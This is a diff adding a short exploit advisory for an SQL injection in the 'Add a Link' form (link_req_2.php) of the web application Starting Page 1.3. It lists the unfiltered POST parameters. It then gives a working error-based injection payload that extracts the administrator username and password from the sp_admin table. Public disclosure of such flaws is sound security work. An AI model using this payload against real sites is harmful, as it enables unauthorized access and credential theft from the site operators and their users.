@@ -1,0 +1,39 @@
+# Exploit Title: Starting Page 1.3 "Add a Link" - SQL Injection
+# Date: 11-01-2017
+# Software Link: http://software.friendsinwar.com/downloads.php?cat_id=2&download_id=11<http://software.friendsinwar.com/downloads.php?cat_id=2&download_id=11>
+# Exploit Author: Ben Lee
+# Contact: benlee9@outlook.com
+# Category: webapps
+
+# Tested on: Win7
+
+
+1. Description
+
+
+The vulnerable file is "link_req_2.php",all the post parameters do not get filtered,then do sql query。
+
+
+2. Vulnerable parameters:
+
+
+'$_POST[category]','$_POST[name]','$_POST[url]','$_POST[description]','$_POST[email]'
+
+
+3.Proof of Concept:
+
+
+Url:http://www.example.com/StartingPage/link_req_2.php
+
+
+Post data:
+
+
+[category=1' AND (select 1 from(select count(*),concat((select(select(select concat(0x7e,0x27,username,0x3a,password,0x27,0x7e)from sp_admin limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND 'a'='a&name=abc&email=admin@admin.com&url=www.xxx.com&description=helloworld]
+
+
+[cid:4be0cc87-4612-4096-ad49-cc18d8cb4033]
+
+
+Best Regards!
+Ben Lee
